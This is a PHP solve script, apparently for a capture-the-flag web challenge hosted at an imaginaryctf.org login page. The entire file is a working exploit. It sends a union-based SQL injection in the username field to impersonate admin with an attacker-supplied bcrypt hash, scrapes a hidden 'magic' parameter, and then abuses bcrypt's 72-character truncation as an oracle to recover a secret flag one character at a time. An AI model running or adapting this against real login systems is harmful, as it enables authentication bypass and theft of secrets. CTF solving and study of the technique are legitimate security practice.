<?php

$target = 'http://login.chal.imaginaryctf.org/';

function do_login($target, $username, $password)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'username' => $username,
        'password' => $password
    ]);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function build_table($pre)
{
    $charset = '{_}?!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $res = [];
    foreach (str_split($charset) as $c) {
        $h = password_hash($pre . $c, PASSWORD_BCRYPT, [
            'cost' => 4
        ]);
        $res[$c] = $h;
    }
    return $res;
}

function get_magic($target)
{
    $pwd = 'peko';
    $h = password_hash($pwd, PASSWORD_BCRYPT, [
        'cost' => 4
    ]);
    $inj = "' union select 'admin', '$h'; -- ";
    $res = do_login($target, $inj, $pwd);
    $magic = explode(' -->', explode('<!-- magic: ', $res)[1])[0];
    return $magic;
}

$magic = get_magic($target);

function oracle($pad, $h)
{
    global $target, $magic;
    $t = $target . "?$magic=1";
    $inj = "' union select 'admin', '$h'; -- ";
    $res = do_login($t, $inj, $pad);
    return strpos($res, 'Welcome admin!') !== false;
}


$known_flag = '';
while (true) {
    // bcrypt truncates the password to 72 characters
    $pad = str_repeat('a', 71 - strlen($known_flag));
    $res = build_table($pad . $known_flag);
    $found = false;
    foreach ($res as $c => $h) {
        if (oracle($pad, $h)) {
            $known_flag .= $c;
            $found = true;
            break;
        }
    }
    echo $known_flag . "\n";
    if (!$found) {
        break;
    }
}
